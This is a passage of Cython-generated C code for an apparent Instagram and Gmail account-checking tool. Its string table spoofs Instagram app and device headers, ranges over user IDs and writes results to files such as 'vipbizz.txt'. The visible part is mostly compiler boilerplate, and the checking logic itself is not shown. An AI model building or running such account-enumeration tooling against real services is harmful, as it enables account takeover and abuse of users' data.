static PyObject *__pyx_n_s_split;
static PyObject *__pyx_n_s_splitlines;
static PyObject *__pyx_n_s_ss;
static PyObject *__pyx_n_s_start;
static PyObject *__pyx_n_s_status_code;
static PyObject *__pyx_kp_u_status_ok;
static PyObject *__pyx_kp_u_strict_origin_when_cross_origin;
static PyObject *__pyx_n_s_string;
static PyObject *__pyx_n_s_sys;
static PyObject *__pyx_n_s_system;
static PyObject *__pyx_n_s_t;
static PyObject *__pyx_n_u_tablet;
static PyObject *__pyx_n_s_target;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_n_s_text;
static PyObject *__pyx_n_u_text;
static PyObject *__pyx_n_s_threading;
static PyObject *__pyx_n_s_threads;
static PyObject *__pyx_n_s_throw;
static PyObject *__pyx_n_s_time;
static PyObject *__pyx_n_s_tl;
static PyObject *__pyx_kp_u_tl_txt;
static PyObject *__pyx_n_s_tll;
static PyObject *__pyx_n_s_tll_locals_genexpr;
static PyObject *__pyx_n_s_tok;
static PyObject *__pyx_n_s_token;
static PyObject *__pyx_n_s_token_hex;
static PyObject *__pyx_n_u_topython8786969_586;
static PyObject *__pyx_n_u_true;
static PyObject *__pyx_n_u_trustedDeviceRecords;
static PyObject *__pyx_n_u_tv;
static PyObject *__pyx_kp_u_u_1_i;
static PyObject *__pyx_kp_u_u_3;
static PyObject *__pyx_n_s_ua;
static PyObject *__pyx_n_s_url;
static PyObject *__pyx_n_u_url;
static PyObject *__pyx_n_s_user;
static PyObject *__pyx_n_u_user;
static PyObject *__pyx_n_u_userID;
static PyObject *__pyx_kp_u_user_agent;
static PyObject *__pyx_n_s_user_agent_2;
static PyObject *__pyx_n_s_user_data;
static PyObject *__pyx_n_s_user_id;
static PyObject *__pyx_n_s_username;
static PyObject *__pyx_n_u_username;
static PyObject *__pyx_kp_u_utf_8;
static PyObject *__pyx_n_s_uui;
static PyObject *__pyx_n_s_uuid;
static PyObject *__pyx_n_s_uuid4;
static PyObject *__pyx_n_s_variable_instance;
static PyObject *__pyx_n_u_variables;
static PyObject *__pyx_kp_u_vipbizz_txt;
static PyObject *__pyx_n_s_vlo;
static PyObject *__pyx_n_u_watch;
static PyObject *__pyx_n_s_write;
static PyObject *__pyx_n_u_x;
static PyObject *__pyx_n_u_x86;
static PyObject *__pyx_n_u_x86_64;
static PyObject *__pyx_kp_u_x_bloks_is_layout_rtl;
static PyObject *__pyx_kp_u_x_bloks_version_id;
static PyObject *__pyx_kp_u_x_chrome_connected;
static PyObject *__pyx_kp_u_x_client_data;
static PyObject *__pyx_kp_u_x_csrftoken;
static PyObject *__pyx_kp_u_x_fb_connection_type;
static PyObject *__pyx_kp_u_x_fb_friendly_name;
static PyObject *__pyx_kp_u_x_fb_lsd;
static PyObject *__pyx_kp_u_x_ig_android_id;
static PyObject *__pyx_kp_u_x_ig_app_id;
static PyObject *__pyx_kp_u_x_ig_app_locale;
static PyObject *__pyx_kp_u_x_ig_bandwidth_speed_kbps;
static PyObject *__pyx_kp_u_x_ig_bandwidth_totalbytes_b;
static PyObject *__pyx_kp_u_x_ig_bandwidth_totaltime_ms;
static PyObject *__pyx_kp_u_x_ig_capabilities;
static PyObject *__pyx_kp_u_x_ig_connection_type;
static PyObject *__pyx_kp_u_x_ig_device_id;
static PyObject *__pyx_kp_u_x_ig_device_locale;
static PyObject *__pyx_kp_u_x_ig_family_device_id;
static PyObject *__pyx_kp_u_x_ig_mapped_locale;
static PyObject *__pyx_kp_u_x_ig_timezone_offset;
static PyObject *__pyx_kp_u_x_ig_www_claim;
static PyObject *__pyx_kp_u_x_mid;
static PyObject *__pyx_kp_u_x_pigeon_rawclienttime;
static PyObject *__pyx_kp_u_x_pigeon_session_id;
static PyObject *__pyx_kp_u_x_requested_with;
static PyObject *__pyx_kp_u_x_same_domain;
static PyObject *__pyx_n_u_xiaomi;
static PyObject *__pyx_n_s_yy;
static PyObject *__pyx_n_u_zh_CN;
static PyObject *__pyx_pf_6source_3tll_genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_3tll_3genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_3tll_6genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_tll(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_2check_gmail(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email); /* proto */
static PyObject *__pyx_pf_6source_4rest(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_user); /* proto */
static PyObject *__pyx_pf_6source_6bunnyiginfo(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_username, CYTHON_UNUSED PyObject *__pyx_v_jj); /* proto */
static PyObject *__pyx_pf_6source_8bunny(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email); /* proto */
static PyObject *__pyx_pf_6source_10bunnycheck_bunny_user_agent(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_10bunnycheck_2genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_10bunnycheck(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email); /* proto */
static PyObject *__pyx_pf_6source_12bunnymain(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_tp_new_6source___pyx_scope_struct__genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_6source___pyx_scope_struct_1_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_6source___pyx_scope_struct_2_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_6source___pyx_scope_struct_3_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static __Pyx_CachedCFunction __pyx_umethod_PyDict_Type_get = {0, &__pyx_n_s_get, 0, 0, 0};
static __Pyx_CachedCFunction __pyx_umethod_PyDict_Type_keys = {0, &__pyx_n_s_keys, 0, 0, 0};
static PyObject *__pyx_int_0;
static PyObject *__pyx_int_1;
static PyObject *__pyx_int_2;
static PyObject *__pyx_int_3;
static PyObject *__pyx_int_4;
static PyObject *__pyx_int_5;
static PyObject *__pyx_int_6;
static PyObject *__pyx_int_8;
static PyObject *__pyx_int_9;
static PyObject *__pyx_int_10;
static PyObject *__pyx_int_15;
static PyObject *__pyx_int_16;
static PyObject *__pyx_int_30;
static PyObject *__pyx_int_32;
static PyObject *__pyx_int_60;
static PyObject *__pyx_int_100;
static PyObject *__pyx_int_111;
static PyObject *__pyx_int_150;
static PyObject *__pyx_int_200;
static PyObject *__pyx_int_999;
static PyObject *__pyx_int_1300;
static PyObject *__pyx_int_2000;
static PyObject *__pyx_int_100000;
static PyObject *__pyx_int_1279000;
static PyObject *__pyx_int_1279001;
static PyObject *__pyx_int_17750000;
static PyObject *__pyx_int_17750001;
static PyObject *__pyx_int_279760000;
static PyObject *__pyx_int_279760001;
static PyObject *__pyx_int_900990000;
static PyObject *__pyx_int_900990001;
static PyObject *__pyx_int_1629010000;
static PyObject *__pyx_int_1900000000;
static PyObject *__pyx_int_2500000000;
static PyObject *__pyx_int_3713668786;
static PyObject *__pyx_int_5699785217;
static PyObject *__pyx_int_8507940634;
static PyObject *__pyx_int_21254029834;
static PyObject *__pyx_tuple_;
static PyObject *__pyx_tuple__2;
static PyObject *__pyx_tuple__3;
static PyObject *__pyx_tuple__7;
static PyObject *__pyx_slice__38;
static PyObject *__pyx_tuple__10;
static PyObject *__pyx_tuple__12;
static PyObject *__pyx_tuple__15;
static PyObject *__pyx_tuple__17;
static PyObject *__pyx_tuple__18;
static PyObject *__pyx_tuple__20;
static PyObject *__pyx_tuple__21;
static PyObject *__pyx_tuple__22;
static PyObject *__pyx_tuple__24;
static PyObject *__pyx_tuple__25;
static PyObject *__pyx_tuple__26;
static PyObject *__pyx_tuple__27;
static PyObject *__pyx_tuple__28;
static PyObject *__pyx_tuple__29;
static PyObject *__pyx_tuple__30;
static PyObject *__pyx_tuple__31;
static PyObject *__pyx_tuple__32;
static PyObject *__pyx_tuple__39;
static PyObject *__pyx_tuple__41;
static PyObject *__pyx_tuple__42;
static PyObject *__pyx_tuple__45;
static PyObject *__pyx_tuple__46;
static PyObject *__pyx_tuple__47;
static PyObject *__pyx_tuple__53;
static PyObject *__pyx_tuple__54;
static PyObject *__pyx_tuple__55;
static PyObject *__pyx_tuple__56;
static PyObject *__pyx_tuple__57;
static PyObject *__pyx_tuple__58;
static PyObject *__pyx_tuple__59;
static PyObject *__pyx_tuple__61;
static PyObject *__pyx_tuple__62;
static PyObject *__pyx_tuple__63;
static PyObject *__pyx_tuple__64;
static PyObject *__pyx_tuple__65;
static PyObject *__pyx_tuple__66;
static PyObject *__pyx_tuple__68;
static PyObject *__pyx_tuple__69;
static PyObject *__pyx_tuple__70;
static PyObject *__pyx_tuple__72;
static PyObject *__pyx_tuple__74;
static PyObject *__pyx_tuple__76;
static PyObject *__pyx_tuple__78;
static PyObject *__pyx_tuple__80;
static PyObject *__pyx_tuple__82;
static PyObject *__pyx_codeobj__40;
static PyObject *__pyx_codeobj__71;
static PyObject *__pyx_codeobj__73;
static PyObject *__pyx_codeobj__75;
static PyObject *__pyx_codeobj__77;
static PyObject *__pyx_codeobj__79;
static PyObject *__pyx_codeobj__81;
static PyObject *__pyx_codeobj__83;
/* Late includes */



/* Python wrapper */
static PyObject *__pyx_pw_6source_1tll(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_1tll = {"tll", (PyCFunction)__pyx_pw_6source_1tll, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_1tll(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("tll (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_tll(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_6source_3tll_2generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */



static PyObject *__pyx_pf_6source_3tll_genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_6source___pyx_scope_struct__genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_6source___pyx_scope_struct__genexpr *)__pyx_tp_new_6source___pyx_scope_struct__genexpr(__pyx_ptype_6source___pyx_scope_struct__genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct__genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 93, __pyx_L1_error)
  } else {
    __Pyx_GOTREF(__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_6source_3tll_2generator, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_tll_locals_genexpr, __pyx_n_s_source); if (unlikely(!gen)) __PYX_ERR(0, 93, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("source.tll.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF(((PyObject *)__pyx_cur_scope));
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_6source_3tll_2generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_6source___pyx_scope_struct__genexpr *__pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct__genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  Py_ssize_t __pyx_t_3;
  PyObject *(*__pyx_t_4)(PyObject *);
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 93, __pyx_L1_error)
  __pyx_r = PyList_New(0); if (unlikely(!__pyx_r)) __PYX_ERR(0, 93, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_r);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_rr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 93, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 93, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 93, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
    __pyx_t_2 = __pyx_t_1; __Pyx_INCREF(__pyx_t_2); __pyx_t_3 = 0;
    __pyx_t_4 = NULL;
  } else {
    __pyx_t_3 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 93, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 93, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  for (;;) {
    if (likely(!__pyx_t_4)) {
      if (likely(PyList_CheckExact(__pyx_t_2))) {
        if (__pyx_t_3 >= PyList_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 93, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 93, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      } else {
        if (__pyx_t_3 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 93, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 93, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      }
    } else {
      __pyx_t_1 = __pyx_t_4(__pyx_t_2);
      if (unlikely(!__pyx_t_1)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 93, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_1);
    }
    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);
    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_1);
    __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_cc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 93, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_yy); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 93, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 93, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(__Pyx_ListComp_Append(__pyx_r, (PyObject*)__pyx_t_1))) __PYX_ERR(0, 93, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_6source_3tll_5generator1(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */



static PyObject *__pyx_pf_6source_3tll_3genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)__pyx_tp_new_6source___pyx_scope_struct_1_genexpr(__pyx_ptype_6source___pyx_scope_struct_1_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 94, __pyx_L1_error)
  } else {
    __Pyx_GOTREF(__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_6source_3tll_5generator1, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_tll_locals_genexpr, __pyx_n_s_source); if (unlikely(!gen)) __PYX_ERR(0, 94, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("source.tll.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF(((PyObject *)__pyx_cur_scope));
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_6source_3tll_5generator1(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *__pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  Py_ssize_t __pyx_t_3;
  PyObject *(*__pyx_t_4)(PyObject *);
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 94, __pyx_L1_error)
  __pyx_r = PyList_New(0); if (unlikely(!__pyx_r)) __PYX_ERR(0, 94, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_r);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_rr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 94, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 94, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 94, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
    __pyx_t_2 = __pyx_t_1; __Pyx_INCREF(__pyx_t_2); __pyx_t_3 = 0;
    __pyx_t_4 = NULL;
  } else {
    __pyx_t_3 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 94, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 94, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  for (;;) {
    if (likely(!__pyx_t_4)) {
      if (likely(PyList_CheckExact(__pyx_t_2))) {
        if (__pyx_t_3 >= PyList_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 94, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 94, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      } else {
        if (__pyx_t_3 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 94, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 94, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      }
    } else {
      __pyx_t_1 = __pyx_t_4(__pyx_t_2);
      if (unlikely(!__pyx_t_1)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 94, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_1);
    }
    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);
    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_1);
    __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_cc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 94, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_yy); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 94, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 94, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(__Pyx_ListComp_Append(__pyx_r, (PyObject*)__pyx_t_1))) __PYX_ERR(0, 94, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_6source_3tll_8generator2(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */



static PyObject *__pyx_pf_6source_3tll_6genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *)__pyx_tp_new_6source___pyx_scope_struct_2_genexpr(__pyx_ptype_6source___pyx_scope_struct_2_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
